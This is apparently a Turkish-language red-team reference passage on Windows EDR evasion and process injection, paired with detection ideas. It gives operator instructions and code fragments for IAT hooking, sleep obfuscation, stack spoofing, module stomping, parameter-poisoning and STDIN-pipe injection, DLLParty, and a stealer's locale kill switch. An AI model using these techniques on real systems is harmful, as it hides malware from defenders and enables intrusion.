Red team'ler, çalışma zamanı kaçınma işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ını (IAT) hook'layıp seçili API'leri saldırganın kontrolündeki, konumdan bağımsız koda (PIC) yönlendirirler. Bu yaklaşım, kaçınma yöntemlerini birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Bir reflective loader kullanarak hedef modülün yanına (başına eklenmiş veya eşlikçi olarak) bir PIC blob'u yükleyin. PIC kendi kendine yeterli ve konumdan bağımsız olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde dolaşın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper'ı, gerçek API adresine tail-call yapmadan önce kaçınma yöntemlerini çalıştırır. Yaygın yöntemler şunlardır:
  - Çağrı öncesinde belleği mask'leme/unmask'leme (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme) ve çağrı sonrasında eski hâline döndürme.
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri bulmasını sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'inin (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilmesi amacıyla bir arayüz dışa aktarın.

Burada IAT hooking kullanmanın nedenleri
- Hook'lanan import'u kullanan tüm kodlarda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemek için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanızı ve bu modüllerin API çağrılarına aynı mask'leme/stack kaçınma yöntemlerini uygulamanızı sağlar.
- CreateProcessA/W'yi wrapper'layarak, call-stack tabanlı tespitlere karşı süreç başlatan post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ sözde kod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch uygulamadan önce yakaladığınız özgün IAT değerini veya LdrGetProcedureAddress'ı kullanarak çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub'ı
- Draugr tarzı PIC stub'ları, sahte bir çağrı zinciri (zararsız modüllerdeki return address'ler) oluşturur ve ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'lerden hassas API'lere giden standart stack'leri bekleyen tespitleri etkisiz kılar.
- API prologue'una ulaşmadan önce beklenen frame'lerin içine yerleşmek için bunu stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'lerin kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API'leri kaydeden bir Aggressor script kullanın.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının periyodik doğrulanması.
- Stack anormallikleri: yüklü image'lere ait olmayan return address'ler; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart üst çağrı zinciri.
- Loader telemetrisi: süreç içinden IAT'ye yapılan yazmalar, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hook'lanmışsa, bellek maskeleme olaylarıyla bağlantılı şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Yerleşik bir PICO aracılığıyla import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da varlığını sürdüren **yerleşik bir PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını değiştiren bir `setup_hooks()` işlevini dışa aktarın (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress`'a devredin.
- Hook hedeflerini link zamanında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, yerleşik PICO'nun içinde bulunduğundan geçerliliğini korur.

Böylece yüklenen DLL'nin kod bölümüne yükleme sonrasında patch uygulamadan **import-time IAT yönlendirmesi** sağlanır.

### Hedef PEB-walking kullanıyorsa hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca işlev hedefin IAT'sinde gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), loader'ın `ProcessImports()` yolu bu import'u görebilsin diye gerçek bir import'u zorlayın:

- Hash'li export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; reflective loader import'ları çözümlerken bu girdinin yakalanmasını sağlar.

### `Sleep()` işlevine patch uygulamadan Ekko tarzı sleep/idle obfuscation

`Sleep` işlevine patch uygulamak yerine, implantın kullandığı **gerçek bekleme/IPC primitive'lerini** hook'layın (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun beklemelerde çağrıyı, idle sırasında bellek içi image'i şifreleyen Ekko tarzı bir obfuscation zincirine sarın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame'leriyle çağıran bir callback dizisi planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'i `PAGE_READWRITE` olarak ayarlayın → tüm eşlenmiş image üzerinde `advapi32!SystemFunction032` ile RC4 şifrelemesi yapın → engelleyici beklemeyi gerçekleştirin → RC4 şifresini çözün → PE section'larını dolaşarak **section başına izinleri geri yükleyin** → tamamlanma sinyali verin.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Image maskeliyken çağıranın devam etmesi için uzun beklemelerde (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, idle aralıklarında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin art arda görülmesi.
- Büyük, bitişik ve image boyutundaki buffer'lar üzerinde `advapi32!SystemFunction032` kullanımı.
- Büyük bir aralıkta `VirtualProtect` çağrısı ve ardından özel section başına izinlerin geri yüklenmesi.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde `jmp [rbx]` veya `jmp rdi` gibi bir function ortasındaki gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığından genellikle süreci `STATUS_STACK_BUFFER_OVERRUN` hatasıyla çökertir. Ekko/Kraken tarzı zincirleri hardening uygulanmış süreçlerde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Zincirde kullanılan her indirect hedefi `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image'lerdeki (`ntdll`, `kernel32`, `advapi32`) adresler için `MEMORY_RANGE_ENTRY`, **image base** değerinden başlamalı ve **image'in tamamını** kapsamalıdır.
- Manuel olarak eşlenmiş/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, dolaylı yoldan erişilen export'ları da işaretleyin (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect hedef olacak saldırgan denetimindeki yürütülebilir section'ları da ekleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, tarayıcılar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'lerde yeniden kullanılabilir bir primitive'e dönüştürür.

### Uyuyan thread'ler için CET-safe stack spoofing

`CONTEXT`'in tümüyle değiştirilmesi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü sahte `Rip` değerinin donanım shadow stack'iyle hâlâ uyumlu olması gerekir. Sleep masking için daha güvenli bir yöntem:<sup>[[30]](#references)</sup>

- Aynı süreçte başka bir thread seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Spoof bağlamına **yalnızca** gerçek `Rip` değerini kopyalayın; sahte `Rsp`/stack durumunu değiştirmeyin.
- Uyku aralığında, stack walker'ların geçerli bir stack aralığında unwind yapması için spoof thread'in `NT_TIB` değerini mevcut TEB'ye kopyalayın.
- Bekleme tamamlandıktan sonra özgün TIB ve thread bağlamını geri yükleyin.

Bu yöntem, TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltırken CET ile uyumlu bir instruction pointer'ı korur.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch fazla ayırt ediciyse, aynı sleep-encrypt-spoof-restore dizisi kuyruğa alınmış APC'ler kullanan askıya alınmış bir yardımcı thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Giriş noktası `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu yardımcı thread stack'i yerine heap üzerinde saklayın.
- Başlangıç event'ini atomik olarak sinyal edip engellemek için `NtSignalAndWaitForSingleObject` kullanın.
- Stack'in yarı geri yüklenmiş hâlde bir scanner tarafından yakalanabileceği yarış penceresini azaltmak için TIB/bağlamı geri yüklemeden önce ana thread'i askıya alın (`NtSuspendThread` → geri yükleme → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile kullanılan `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısının ardından mevcut thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı yoldan `SystemFunction032`, `VirtualProtect` veya section izinlerini geri yükleyen yardımcı işlevlere ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerin içindeki dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine, payload'ları **hedef süreçte önceden eşlenmiş bir DLL'nin `.text` section'ından** yürütür. Üzerine yazılacak hedef, süreçte hâlâ gerekli olan kod yollarını bozmadan payload'ı barındırabilecek **yüklenmiş, disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere gelişigüzel stomping uygulamak kırılgandır: DLL uzak süreçte yüklü olmayabilir ve kod bölgesinin çok küçük olması sürecin çökmesine yol açabilir. Daha güvenilir bir iş akışı:

1. Hedef sürecin modüllerini sıralayın ve zaten yüklenmiş DLL'lerden oluşan **yalnızca adları içeren bir include list** tutun.
2. Önce payload'ı oluşturup **tam byte boyutunu** kaydedin.
3. Aday DLL'leri diskte tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü yürütülebilir section'ın **belleğe eşlendiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**'i ayrıştırın ve stomp başlangıç offset'i olarak dışa aktarılmış bir işlevin RVA'sını seçin.
5. **Blast radius**'u hesaplayın: payload seçilen işlevin sınırını aşarsa, bellekte arkasından gelen bitişik export'ların üzerine yazılır.

Sahada görülen tipik keşif/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Telemetriyi `LoadLibrary`/beklenmedik image yüklemelerinden kaçınmak için uzak süreçte **zaten yüklü** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal kod yolları, thread oluşturulmadan önce veya sonra değiştirilmiş baytlara erişebilir.
- Büyük implantlar, tam buffer'ın injector kaynak kodunda doğru şekilde temsil edilmesi için shellcode'un gömülme biçiminin string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirebilir.

Detection ideas
- Daha yaygın olan özel RWX/RX allocation'ları yerine **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) içine yapılan uzak yazmalar.
- Bellekteki baytları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk baytları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` sayfalarına yönelik şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizilerinin ardından thread oluşturulması.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik uzak yazma yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe baytları kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini alt sürece **kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması özelliğinden yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Carrier'larla ilgili pratik kısıtlamalar:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleğe** işaret etmelidir ve null sonlandırıcı dahil **32,767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, ardışık `NAME=VALUE\0` string'lerinden ve bunları sonlandıran ek bir `\0` karakterinden oluşan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, belgelenmiş ve kararlı bir sözleşme yerine uygulama ayrıntısı olarak değerlendirilmelidir.

Bu yaklaşım, normal süreç oluşturmayı **payload-transfer primitive**'ine dönüştürür. Operatör, saldırgan denetimindeki başlangıç verileriyle alt süreci oluşturur ve Windows'un süreçler arası kopyalamayı gerçekleştirmesini sağlar.

### Remote write API'leri olmadan remote lookup akışı

Alt süreç oluşturulduktan sonra, kopyalanan buffer'ı **salt okunur** primitive'lerle bulabilirsiniz:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Uzak `PEB`'i okuyun
3. `PEB.ProcessParameters` alanını izleyin
4. `RTL_USER_PROCESS_PARAMETERS` yapısını okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre tamponunu yürütme

Kopyalanan parametre bölgesi genellikle `RW` olur, yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış durumda değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` tarafından zaten döndürülen ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` değerini üzerine yazar) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak, bunun için `SuspendThread` / `ResumeThread` **gerekmez**; döndürülen ana iş parçacığı tanıtıcısının bağlamı doğrudan değiştirilebilir.

Bu, enjeksiyon için sıkça izlenen birkaç API'nin kullanılmasını önler:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu durumda ayrıca `SuspendThread` / `ResumeThread`

### Null-byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının tümü **string veya string benzeri veriler** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Kullanışlı bir çözüm, çalışma zamanında sabitleri yeniden oluşturan ve ardından rastgele bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir örüntü, XOR tabanlı sabit sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL yollarını veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli işaretçilere ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten `PAGE_READWRITE` ayrılmış bir bellek alanına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX bellek ayırmaktan kaçınarak buraya atlanabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory` çağrıları
- bu koruma değişikliğinin ardından gelen `SetThreadContext` / `NtSetContextThread`
- `PEB`'nin ve ardından `RTL_USER_PROCESS_PARAMETERS`'ın uzaktan okunması
- süreç oluşturma sırasında olağandışı uzunlukta / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, kendi başına tam bir execution primitive değil, **süreçler arası aktarım hilesidir**: kopyalanan parametre hâlâ execute izni değişikliği ve execution yönlendirme yöntemi gerektirir.
- `RtlCreateProcessReflection` / Dirty Vanity, yazarlar tarafından değerlendirildi ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere ulaştığı için reddedildi.

Bekleyen thread'lerin dönüş adresini ele geçirme işleminin ardından thread açıklamaları aracılığıyla **mevcut** bir Windows sürecine payload aktarmak için bkz. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Etkileşimli bir console child da **payload aktarım primitive'i** olarak kullanılabilir. Injector, child'ın standart girişini bir pipe'a yönlendirir ve ardından bir marker ile shellcode'u gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable hâle getirir ve bir child thread'i buraya yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak genel bir EDR bypass değil, hâlâ process injection'dır.<sup>[[41]](#references)</sup>

"named-pipe" açıklamasına rağmen, referans uygulaması `CreatePipe` çağırır; bu bir **anonymous pipe** oluşturur. Windows, anonymous pipe'ları dahili olarak benzersiz adlara sahip pipe nesneleriyle uygular; ancak PoC ne bir `\\.\pipe\<name>` yolu seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir security descriptor ile devralınabilir handle'lar oluşturur, okuma handle'ını `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarlar ve handle inheritance etkin durumdayken yeni bir child başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir sürece bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluşturur. Parent tarafındaki iki handle'da inheritance özelliğini kaldırır ve süreç oluşturulduktan sonra child tarafındaki kopyaları parent'ta kapatır.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlatır. Child, yönlendirilmiş standart handle'ları devralır.
3. Parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile `rawData` binary dizisinin tamamını gönderir. Console programı byte'ları tüketir ve kopyasını kendi özel committed bölgelerinden birinde bırakır.
4. `VirtualQueryEx` ile child'ın adres alanını dolaşır, `ReadProcessMemory` ile aday `MEM_PRIVATE` bölgelerini okur ve `rawData`'nın başlangıcındaki marker'ı arar.
5. Bulunan buffer'ın iznini `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirir.
6. Ana thread'i bulur, askıya alır, `NtSetContextThread` ile `RIP`'yi `found_address + 0x19` olarak ayarlar ve thread'i devam ettirir.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özeldir: `CONTEXT.Rip` değerini değiştirir ve gömülü payload'ı x64 shellcode'dur. `rawData` 25 baytlık bir işaretleyiciyle başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` ofsetinde başlar. Payload'ı değiştirirken bu düzeni koruyun veya işaretleyiciyi, arama vektörünü, dizi boyutunu ve yürütme ofsetini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` karakterleri de bad characters olarak listelenmiştir. Bu iş akışı, alt sürecin token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük yerel yardımcılar ve payload derleme kalıpları için [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) sayfasına bakın.

## Shellcode kullanmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection yöntemini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ını çalıştırmak yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef havuzun I/O completion port'una kuyruğa alınan bir `TP_DIRECT` completion'dır. Bu yöntem süreç izinlerini aşmaz: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağrısı yapar ve hedef belleğin okunabilir/yazılabilir olmasını, ayrıca worker-factory ve completion-port handle'larının çoğaltılabilmesini gerektirir.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack üzerinde tutulan `TP_CALLBACK_INSTANCE` işaretçisini ilk callback argümanı olan `RCX` üzerinden iletir. `LoadLibraryA` aynı işaretçiyi `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` konumunda oluştururken bu nesneye yaptığı ilk olağan yazma `RSP+0x1d0` konumundadır. Bu nedenle, 0x58 baytlık bu öneke sığan null sonlandırmalı bir DLL yolu, dispatch öncesinde üzerine yazılmadan instance'ın başlangıcında tutulabilir. Bu, derlemeye özgü bir gözlemdir; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans iş akışı şöyledir:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` kullanarak hedefin handle'larını sıralayın ve nesne türlerini sorgulayarak `TpWorkerFactory` olanları belirleyin. Bir worker-factory handle'ını çoğaltın ve `WorkerFactoryBasicInformation` bilgilerini sorgulayın; `StartParameter`, uzak `TP_POOL` değerini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
2. `TP_POOL.CompletionPort` değerini okuyun ve havuzun özel worker listesini izleyin. Test edilen Windows 10 19045 x64 derlemesinde (`ntdll.dll 10.0.19041.4842`), listenin başı `pool+0x60` konumundadır; her bağlantı `worker+0x10` konumundadır, dolayısıyla `worker+0x38` konumundaki callback-instance yuvası `link+0x28` değerine eşittir. PoC; işaretçi hizalamasını, bağlantıların karşılıklılığını, havuz sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve sabit bir liste başını denetler.
3. Kuyruğa alınan completion herhangi bir worker tarafından tüketilebileceğinden, DLL yolunu bulunan **tüm** worker yuvalarına yazın. Yazılabilir hedef belleğe `Callback = LoadLibraryA` içeren bir `TP_DIRECT` yerleştirin. PoC, `VirtualAllocEx` yerine worker stack'inde `last_slot-0x500` ofsetini kullanır; bu ofset deneyseldir ve etkin stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını çoğaltın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısını yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker, üzerine yazılmış callback-instance işaretçisiyle `LoadLibraryA` çağırır ve hedefin erişebildiği bir DLL'i yükler.

PoC bir hedef PID alır (`DLLParty.exe <target_pid>`) ve `DLLParty.cpp` dosyasında sabit kodlanmış bir DLL yolu kullanır; x64 yürütülebilir dosyayı derlemeden önce hedefin erişebileceği bir yol ayarlayın. Ayrıca kendi sürecindeki `LoadLibraryA` adresini uzak callback olarak kullanır; bu nedenle adresin hedefte de geçerli olduğunu varsayar. Kod, yol uzunluğunu 0x58 baytlık önekle karşılaştırmaz ve dizinin son öğesini indekslemeden önce worker dolaşımında bir yuva bulunup bulunmadığını denetlemez. Hedef derleme için özel ofsetleri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanımından kaçınmak, süreçler arası yazmaları veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Taktikleri

SantaStealer (BluelineStealer olarak da bilinir), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl harmanladığını gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni denetimi ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa örnek, boş bir `CIS` işaretleyicisi bırakır ve stealer'ları çalıştırmadan sonlanır. Böylece hariç tutulan yerel ayarlarda çalışmasını önlerken avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

